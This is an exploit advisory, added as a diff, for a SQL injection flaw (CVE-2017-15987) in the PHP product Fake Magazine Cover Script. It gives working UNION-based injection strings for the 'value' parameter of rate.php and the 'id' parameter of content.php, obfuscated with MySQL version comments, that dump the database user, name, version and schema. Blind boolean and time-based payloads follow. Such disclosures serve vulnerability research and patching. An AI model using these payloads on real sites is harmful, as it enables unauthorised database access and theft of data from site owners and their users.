@@ -1,0 +1,49 @@
+# # # # # 
+# Exploit Title: Fake Magazine Cover Script - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.websitescripts.org/
+# Software Link: http://www.websitescripts.org/website-scripts/fake-magazine-cover-script/prod_81.html
+# Demo: http://websitescripts.org/demo/magazinecoverscript/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15987
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/rate.php?value=[SQL]
+# 
+# -1047+/*!00005UniOn*/+/*!00005SelEct*/+CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),2--+-
+# 
+# http://localhost/[PATH]/content.php?id=[SQL]
+# 
+# -237+/*!00005UNION*/+/*!00005SELECT*/+1,2,3,4,5,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),7,8,9,10,11,12,13--+-
+# 
+# Parameter: value (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: value=1047 AND 6465=6465
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: value=1047 AND SLEEP(5)
+# 
+# Parameter: id (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: id=237 AND 1343=1343
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: id=237 AND SLEEP(5)
+# 	
+# Etc..
+# # # # #
